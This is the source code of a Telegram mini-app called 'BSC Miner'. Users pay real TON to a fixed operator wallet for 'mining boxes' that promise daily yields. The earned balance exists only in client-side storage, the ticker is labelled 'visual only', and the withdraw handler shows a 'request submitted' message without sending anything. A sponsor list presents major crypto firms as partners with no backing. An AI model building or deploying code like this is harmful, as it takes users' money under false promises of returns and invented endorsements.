import { useState, useEffect, useRef, useCallback } from 'react';
import { Home, Sparkles, Users, Settings, X, ChevronRight, Zap, Gift, Share2, UserPlus, Send } from 'lucide-react';
import { TonConnectButton, useTonConnectUI, useTonAddress } from '@tonconnect/ui-react';

type Tab = 'home' | 'upgrade' | 'friends';

interface MinerState {
  hash_rate: number;
  bsc_balance: number;
  total_claimed: number;
  last_claim_at: number;
  boxes_owned: string[];
  tasks_done: string[];
  ref_by: string | null;
  invited_count: number;
}

const DEFAULT_STATE: MinerState = {
  hash_rate: 0.000000163,
  bsc_balance: 0,
  total_claimed: 0,
  last_claim_at: Date.now(),
  boxes_owned: [],
  tasks_done: [],
  ref_by: null,
  invited_count: 0,
};

const BOXES = [
  { id: 'core',    name: 'BSC Core',    price: 1,   yield: 0.0187488, color: 'from-amber-700 to-amber-900' },
  { id: 'flux',    name: 'BSC Flux',    price: 2,   yield: 0.0375840, color: 'from-slate-500 to-slate-700' },
  { id: 'pulse',   name: 'BSC Pulse',   price: 5,   yield: 0.0563328, color: 'from-yellow-600 to-amber-800' },
  { id: 'vector',  name: 'BSC Vector',  price: 10,  yield: 0.0750816, color: 'from-cyan-600 to-blue-800' },
  { id: 'matrix',  name: 'BSC Matrix',  price: 20,  yield: 0.1126656, color: 'from-blue-600 to-indigo-800' },
  { id: 'quantum', name: 'BSC Quantum', price: 50,  yield: 0.2252448, color: 'from-purple-600 to-pink-800' },
  { id: 'hyper',   name: 'BSC Hyper',   price: 100, yield: 0.4827168, color: 'from-orange-600 to-red-800' },
  { id: 'prime',   name: 'BSC Prime',   price: 200, yield: 1.1262240, color: 'from-violet-600 to-fuchsia-800' },
];

const TASKS = [
  { id: 'join_channel',  title: 'Basonce Channel',  reward: 0.01, url: 'https://t.me/basonce', icon: Send },
  { id: 'boost_channel', title: 'Boost Channel',    reward: 0.01, url: 'https://t.me/boost/basonce', icon: Zap },
  { id: 'share_story',   title: 'Share Story',      reward: 0.01, url: '', icon: Share2 },
  { id: 'invite_5',      title: 'Invite 5 Friends', reward: 0.1,  url: '', icon: UserPlus },
];

const SPONSORS = ['HASHKEY', 'arrington', 'COGITENT', 'Y Combinator', 'PancakeSwap', 'LEDGER', 'NEAR', 'alchemy', 'METAMASK'];

const OPERATOR_WALLET = 'UQCeytNeGzjIuutg5vZJETyrlg7Mqp0Vm4a0iU7RRTihqh6n';
const BOT_USERNAME = 'Basonce_Miner_Bot';
const WITHDRAW_MIN = 100;

// Telegram CloudStorage helpers with localStorage fallback
const tg: any = typeof window !== 'undefined' ? (window as any).Telegram?.WebApp : null;

function loadState(): Promise<MinerState> {
  return new Promise((resolve) => {
    if (tg?.CloudStorage) {
      tg.CloudStorage.getItem('miner_state', (err: any, val: string) => {
        if (err || !val) return resolve({ ...DEFAULT_STATE });
        try { resolve({ ...DEFAULT_STATE, ...JSON.parse(val) }); } catch { resolve({ ...DEFAULT_STATE }); }
      });
    } else {
      const v = localStorage.getItem('miner_state');
      if (!v) return resolve({ ...DEFAULT_STATE });
      try { resolve({ ...DEFAULT_STATE, ...JSON.parse(v) }); } catch { resolve({ ...DEFAULT_STATE }); }
    }
  });
}

function saveState(s: MinerState): Promise<void> {
  return new Promise((resolve) => {
    const v = JSON.stringify(s);
    if (tg?.CloudStorage) {
      tg.CloudStorage.setItem('miner_state', v, () => resolve());
    } else {
      localStorage.setItem('miner_state', v);
      resolve();
    }
  });
}

function getTelegramUser(): { id: number; username?: string; first_name?: string } | null {
  return tg?.initDataUnsafe?.user || null;
}

export default function MinerMiniAppPage() {
  const [tab, setTab] = useState<Tab>('home');
  const [state, setState] = useState<MinerState | null>(null);
  const [liveBalance, setLiveBalance] = useState(0);
  const [claiming, setClaiming] = useState(false);
  const [buying, setBuying] = useState<string | null>(null);
  const [toast, setToast] = useState<string | null>(null);
  const [tonConnectUI] = useTonConnectUI();
  const tonAddress = useTonAddress();
  const stateRef = useRef<MinerState | null>(null);

  useEffect(() => { stateRef.current = state; }, [state]);

  // Init Telegram WebApp
  useEffect(() => {
    if (tg) {
      try {
        tg.ready();
        tg.expand();
        tg.setHeaderColor('#0a0a14');
        tg.setBackgroundColor('#0a0a14');
      } catch {}
    }
    // Ref code from URL
    const params = new URLSearchParams(window.location.search);
    const ref = params.get('ref') || tg?.initDataUnsafe?.start_param || null;
    loadState().then((s) => {
      if (ref && !s.ref_by) s.ref_by = ref;
      setState(s);
    });
  }, []);

  // Live balance ticker (visual only)
  useEffect(() => {
    if (!state) return;
    const update = () => {
      const elapsedSec = (Date.now() - state.last_claim_at) / 1000;
      const earned = state.hash_rate * elapsedSec;
      setLiveBalance(state.bsc_balance + earned);
    };
    update();
    const i = setInterval(update, 100);
    return () => clearInterval(i);
  }, [state]);

  const showToast = (m: string) => { setToast(m); setTimeout(() => setToast(null), 2500); };

  const handleClaim = async () => {
    if (!state || claiming) return;
    setClaiming(true);
    const now = Date.now();
    const earned = state.hash_rate * ((now - state.last_claim_at) / 1000);
    if (earned <= 0) { setClaiming(false); return; }
    const next: MinerState = {
      ...state,
      bsc_balance: state.bsc_balance + earned,
      total_claimed: state.total_claimed + earned,
      last_claim_at: now,
    };
    await saveState(next);
    setState(next);
    setClaiming(false);
    showToast(`+${earned.toFixed(8)} BSC claimed`);
    if (tg?.HapticFeedback) tg.HapticFeedback.impactOccurred('medium');
  };

  const handleBuyBox = useCallback(async (box: typeof BOXES[0]) => {
    if (!state || buying) return;
    if (!tonAddress) {
      tonConnectUI.openModal();
      return;
    }
    setBuying(box.id);
    try {
      // Build TON transaction (nanotons: 1 TON = 1_000_000_000)
      const amountNano = BigInt(Math.floor(box.price * 1_000_000_000)).toString();
      const result = await tonConnectUI.sendTransaction({
        validUntil: Math.floor(Date.now() / 1000) + 360,
        messages: [{
          address: OPERATOR_WALLET,
          amount: amountNano,
          payload: undefined,
        }],
      });
      // result.boc is the BoC of the signed message
      const txHash = result.boc.slice(0, 32); // pseudo hash for client display
      const next: MinerState = {
        ...state,
        hash_rate: state.hash_rate + (box.yield / 86400), // daily yield → per-second
        boxes_owned: [...state.boxes_owned, `${box.id}:${Date.now()}:${txHash}`],
      };
      await saveState(next);
      setState(next);
      showToast(`✓ ${box.name} activated! +${box.yield.toFixed(4)} BSC/day`);
      if (tg?.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
    } catch (e: any) {
      showToast(e?.message?.includes('UserReject') ? 'Transaction cancelled' : 'Payment failed');
    } finally {
      setBuying(null);
    }
  }, [state, buying, tonAddress, tonConnectUI]);

  const handleTask = async (task: typeof TASKS[0]) => {
    if (!state || state.tasks_done.includes(task.id)) return;
    if (task.url) {
      if (tg?.openTelegramLink && task.url.startsWith('https://t.me/')) {
        tg.openTelegramLink(task.url);
      } else {
        window.open(task.url, '_blank');
      }
    }
    if (task.id === 'invite_5' && state.invited_count < 5) {
      showToast(`${state.invited_count}/5 friends invited`);
      return;
    }
    setTimeout(async () => {
      const cur = stateRef.current;
      if (!cur || cur.tasks_done.includes(task.id)) return;
      const next: MinerState = {
        ...cur,
        bsc_balance: cur.bsc_balance + task.reward,
        tasks_done: [...cur.tasks_done, task.id],
      };
      await saveState(next);
      setState(next);
      showToast(`+${task.reward} BSC reward`);
    }, 3000);
  };

  const handleWithdraw = async () => {
    if (!state) return;
    if (liveBalance < WITHDRAW_MIN) {
      showToast(`Min withdrawal: ${WITHDRAW_MIN} BSC. You have ${liveBalance.toFixed(6)}`);
      return;
    }
    showToast('Withdrawal request submitted to basonce.com');
    // TODO: POST to /api/miner/withdraw
  };

  const tgUser = getTelegramUser();
  const refLink = `https://t.me/${BOT_USERNAME}?startapp=${tgUser?.id || 'web'}`;
  const copyRefLink = () => {
    navigator.clipboard.writeText(refLink).then(() => showToast('Link copied!'));
  };

  if (!state) {
    return (
      <div className="fixed inset-0 bg-[#0a0a14] flex items-center justify-center text-white">
        <div className="animate-pulse">Loading…</div>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 bg-[#0a0a14] text-white flex flex-col" style={{ paddingTop: 'env(safe-area-inset-top)' }}>
      {/* Top bar */}
      <div className="flex items-center justify-between px-4 py-3 bg-white text-black">
        <div className="font-bold text-lg">BSC MINER</div>
        <div className="flex items-center gap-3">
          <Settings className="w-5 h-5" />
          <X className="w-5 h-5" onClick={() => { window.location.hash = ''; }} />
        </div>
      </div>

      {/* Content */}
      <div className="flex-1 overflow-y-auto pb-20">
        {tab === 'home' && (
          <div className="p-4 space-y-4">
            <div className="text-center pt-6">
              <div className="text-blue-400 text-sm font-semibold mb-2">BSC</div>
              <div className="text-blue-400 text-4xl font-bold tabular-nums">{liveBalance.toFixed(8)}</div>
            </div>
            <div className="flex justify-center my-4">
              <div className="w-32 h-32 rounded-full bg-gradient-to-br from-cyan-500 via-blue-600 to-purple-700 flex items-center justify-center shadow-2xl shadow-blue-500/50">
                <div className="w-24 h-24 rounded-full bg-[#0a0a14] flex items-center justify-center">
                  <span className="text-3xl font-black bg-gradient-to-r from-cyan-400 to-purple-400 bg-clip-text text-transparent">BSC</span>
                </div>
              </div>
            </div>
            <div className="text-center text-blue-300 text-sm">
              Total Power: <span className="font-mono">{state.hash_rate.toFixed(9)} BSC/s</span>
            </div>
            <button
              onClick={handleClaim}
              disabled={claiming}
              className="w-full py-4 rounded-2xl bg-gradient-to-r from-blue-500 to-blue-600 text-white font-bold text-lg shadow-lg shadow-blue-500/30 active:scale-95 transition"
            >
              {claiming ? 'Claiming…' : 'Claim'}
            </button>
            <button
              onClick={() => setTab('upgrade')}
              className="w-full py-4 rounded-2xl bg-white text-black font-bold text-lg active:scale-95 transition"
            >
              Upgrade
            </button>

            <div className="mt-6 bg-[#13131f] rounded-xl p-4">
              <div className="text-sm font-semibold mb-3">Wallet Balance</div>
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-full bg-gradient-to-br from-cyan-500 to-purple-600 flex items-center justify-center text-xs font-bold">BSC</div>
                  <div>
                    <div className="text-lg font-bold">{liveBalance.toFixed(4)}</div>
                    <div className="text-xs text-gray-400">≈ ${(liveBalance * 0.05).toFixed(2)}</div>
                  </div>
                </div>
                <button
                  onClick={handleWithdraw}
                  className={`px-5 py-2 rounded-lg text-sm font-semibold ${liveBalance >= WITHDRAW_MIN ? 'bg-blue-500 text-white' : 'bg-gray-700 text-gray-500'}`}
                >
                  Withdraw
                </button>
              </div>
              <div className="text-xs text-gray-500 mt-2">
                Min withdrawal: {WITHDRAW_MIN} BSC → credited as USDT to your basonce.com wallet
              </div>
            </div>

            {/* Sponsors */}
            <div className="mt-6">
              <div className="text-center text-sm font-semibold mb-3 text-gray-400">Sponsors and Partners</div>
              <div className="grid grid-cols-3 gap-2">
                {SPONSORS.map((s) => (
                  <div key={s} className="bg-[#13131f] rounded-lg py-3 text-center text-xs text-gray-300 font-semibold uppercase tracking-wide">
                    {s}
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {tab === 'upgrade' && (
          <div className="p-3">
            <div className="mb-3 flex items-center justify-between">
              <div className="text-sm text-gray-400">Buy with TON</div>
              <TonConnectButton />
            </div>
            <div className="grid grid-cols-2 gap-2">
              {BOXES.map((box) => {
                const owned = state.boxes_owned.filter((b) => b.startsWith(box.id + ':')).length;
                return (
                  <div key={box.id} className="bg-[#13131f] rounded-xl overflow-hidden border border-gray-800">
                    <div className="px-2 py-1 text-[10px] font-bold text-blue-400">{owned}/1</div>
                    <div className={`aspect-square bg-gradient-to-br ${box.color} flex items-center justify-center relative`}>
                      <div className="text-4xl">📦</div>
                      {owned > 0 && <div className="absolute top-1 right-1 text-xs bg-green-500 rounded-full w-5 h-5 flex items-center justify-center">✓</div>}
                    </div>
                    <div className="p-2 text-center">
                      <div className="font-bold text-sm">{box.name}</div>
                      <div className="text-xs text-gray-400 mt-1">Daily yield</div>
                      <div className="text-blue-400 font-mono text-sm">{box.yield.toFixed(7)} BSC</div>
                      <button
                        onClick={() => handleBuyBox(box)}
                        disabled={buying === box.id}
                        className="w-full mt-2 py-2 rounded-lg bg-[#1f1f2e] text-white text-sm font-bold border-t border-gray-700 active:bg-blue-600 transition disabled:opacity-50"
                      >
                        {buying === box.id ? '⏳' : `${box.price} TON`}
                      </button>
                    </div>
                  </div>
                );
              })}
            </div>
            {!tonAddress && (
              <div className="mt-4 p-3 bg-blue-500/10 border border-blue-500/30 rounded-lg text-xs text-blue-200">
                💡 Connect your TON wallet (Tonkeeper, MyTonWallet) to purchase boxes. Payments are instant, on-chain.
              </div>
            )}
          </div>
        )}

        {tab === 'friends' && (
          <div className="p-4 space-y-3">
            <div className="bg-[#13131f] rounded-xl p-4">
              <div className="text-sm font-semibold mb-2">Your invite link</div>
              <div className="bg-[#0a0a14] rounded-lg p-3 text-xs font-mono break-all text-blue-300">{refLink}</div>
              <button onClick={copyRefLink} className="w-full mt-3 py-3 rounded-lg bg-gradient-to-r from-blue-500 to-blue-600 font-bold">
                Copy & Share Link
              </button>
              <div className="text-xs text-gray-400 mt-2 text-center">
                You invited <span className="text-blue-400 font-bold">{state.invited_count}</span> friends
              </div>
            </div>

            <div className="text-sm font-semibold text-gray-400 px-1 pt-2">Tasks</div>
            {TASKS.map((t) => {
              const done = state.tasks_done.includes(t.id);
              const Icon = t.icon;
              return (
                <button
                  key={t.id}
                  onClick={() => handleTask(t)}
                  disabled={done}
                  className="w-full bg-[#13131f] rounded-xl p-3 flex items-center gap-3 active:scale-98 transition disabled:opacity-50"
                >
                  <div className="w-10 h-10 rounded-full bg-gradient-to-br from-blue-500 to-purple-600 flex items-center justify-center">
                    <Icon className="w-5 h-5" />
                  </div>
                  <div className="flex-1 text-left">
                    <div className="font-semibold text-sm">{t.title}</div>
                    <div className="text-xs text-blue-400">+{t.reward} BSC</div>
                  </div>
                  <div className={`px-3 py-1 rounded-full text-xs font-bold ${done ? 'bg-green-500/20 text-green-400' : 'bg-blue-500 text-white'}`}>
                    {done ? '✓' : 'GO'}
                  </div>
                </button>
              );
            })}
          </div>
        )}
      </div>

      {/* Bottom nav */}
      <div className="fixed bottom-0 left-0 right-0 bg-[#0a0a14] border-t border-gray-800 grid grid-cols-3" style={{ paddingBottom: 'env(safe-area-inset-bottom)' }}>
        {[
          { id: 'home', label: 'Home', icon: Home },
          { id: 'upgrade', label: 'Upgrade', icon: Sparkles },
          { id: 'friends', label: 'Friends', icon: Users },
        ].map((t) => {
          const Icon = t.icon;
          const active = tab === t.id;
          return (
            <button key={t.id} onClick={() => setTab(t.id as Tab)} className={`py-3 flex flex-col items-center gap-1 ${active ? 'text-white' : 'text-gray-500'}`}>
              <Icon className="w-5 h-5" />
              <span className="text-[10px] font-semibold">{t.label}</span>
              {active && <div className="w-6 h-0.5 bg-white rounded-full" />}
            </button>
          );
        })}
      </div>

      {/* Toast */}
      {toast && (
        <div className="fixed bottom-24 left-4 right-4 bg-black/90 text-white text-center py-3 px-4 rounded-xl text-sm font-medium z-50">
          {toast}
        </div>
      )}

      {/* Bot username footer */}
      <div className="absolute bottom-16 left-0 right-0 text-center text-xs text-gray-500 pointer-events-none">
        @{BOT_USERNAME}
      </div>
    </div>
  );
}
